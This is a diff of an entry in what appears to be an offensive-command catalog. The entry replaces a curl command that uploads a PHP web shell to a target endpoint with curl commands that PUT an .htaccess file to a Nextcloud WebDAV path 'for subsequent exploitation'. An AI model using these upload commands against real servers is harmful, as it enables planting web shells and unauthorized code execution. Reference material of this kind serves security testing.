@@ -1,16 +1,23 @@
 ---
-id: cmd-002
-data: 'curl -X POST -F "file=@shell.php" http://target.com/upload.php'
+id: cmd-curl-upload
+data: >-
+  curl -X PUT -u username:password
+  'https://nextcloud.example.com/remote.php/dav/files/username/test.htaccess'
+  --data-binary '@.htaccess' -H 'Content-Type: text/plain'
 tags:
+  - webdav
   - upload
-  - http
 type: command
-output: null
+output: |-
+  HTTP/1.1 201 Created
+  <dav:propstat><dav:status>HTTP/1.1 201 Created</dav:status></dav:propstat>
 executor: bash
 platforms:
   - Linux
+  - macOS
+  - Windows
 created_at: '2023-10-01T00:00:00Z'
-updated_at: '2025-12-14T05:32:13.734Z'
+updated_at: '2025-12-14T17:26:06.556Z'
 verified: false
 validated: true
 submitted: true
@@ -20,39 +27,41 @@ submitted: true
 ## Command
 
 ```bash
-curl -X POST -F "file=@shell.php" http://target.com/upload.php
+curl -X PUT -u username:password 'https://nextcloud.example.com/remote.php/dav/files/username/test.htaccess' --data-binary '@.htaccess' -H 'Content-Type: text/plain'
 ```
 
 ## Description
 
-Uploads a local file (e.g., PHP shell) to a target web endpoint via HTTP POST multipart form data, exploiting vulnerable upload features.
+This command uploads a local .htaccess file to Nextcloud via its WebDAV API, using basic authentication to place the file in the user's directory for subsequent exploitation.
 
 ## Parameters
 
 | Parameter | Description | Required |
 |-----------|-------------|----------|
-| `-X POST` | Specifies POST method | Yes |
-| `-F "file=@shell.php"` | Form field with file attachment | Yes |
-| `http://target.com/upload.php` | Target upload endpoint | Yes |
+| `-X PUT` | Specifies the HTTP PUT method for upload | Yes |
+| `-u username:password` | Provides basic auth credentials | Yes |
+| URL | Target WebDAV endpoint | Yes |
+| `--data-binary '@.htaccess'` | Reads file content for upload | Yes |
+| `-H 'Content-Type: text/plain'` | Sets MIME type | No |
 
 ## Examples
 
 ### Basic Usage
 
 ```bash
-curl -X POST -F "file=@shell.php" http://target.com/upload.php
+curl -X PUT -u user:pass 'https://target.com/remote.php/dav/files/user/file.htaccess' --data-binary '@file.htaccess'
 ```
 
 ### Advanced Usage
 
 ```bash
-curl -X POST -F "file=@shell.php" -F "submit=Upload" http://target.com/upload.php --verbose
+curl -X PUT -u user:pass 'https://target.com/remote.php/dav/files/user/file.htaccess' --data-binary '@file.htaccess' -H 'OCS-APIRequest: true' --fail
 ```
 
 ## Expected Output
 
-HTTP response from server, such as 200 OK with success message or file path. Errors indicate failure (e.g., 403 Forbidden).
+Successful upload returns HTTP 201 Created with XML response confirming the propstat status.
 
 ## Related
 
-- [[Related Procedure]]
+- [[Related Procedure|procedures/Upload-htaccess-File-to-Nextcloud]]
